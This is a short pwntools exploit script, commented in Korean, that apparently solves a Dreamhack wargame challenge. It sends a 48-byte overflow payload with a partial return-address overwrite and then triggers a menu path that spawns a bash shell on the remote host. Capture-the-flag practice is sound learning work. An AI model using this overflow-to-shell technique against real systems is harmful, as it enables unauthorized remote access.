from pwn import *

host = "host3.dreamhack.games"
port = 18572

p = remote(host, port)

# [중요] 메뉴 프롬프트 대기
p.recvuntil(b'> ')

# 1. 메뉴 선택 '1'을 개행과 함께 보냅니다.
# scanf는 '1'을 읽고 '\n'에서 멈춥니다. '\n'은 버려지거나 버퍼에 남지만,
# read가 OS에서 직접 읽을 payload에는 영향을 주지 않게 됩니다.
p.sendline(b'1')

# 2. 아주 짧은 대기 (네트워크 상황 고려, 필수는 아니지만 안정성 확보)
# sleep(0.1) 

# 3. Payload만 따로 보냅니다.
# 이제 read함수는 온전한 payload를 읽게 됩니다.
payload = b'A' * 48 + b'\x6d\xab\x21'
p.send(payload)

# Exit 메뉴 선택 -> system("bash") 실행
p.sendlineafter(b'> ', b'2')

p.interactive()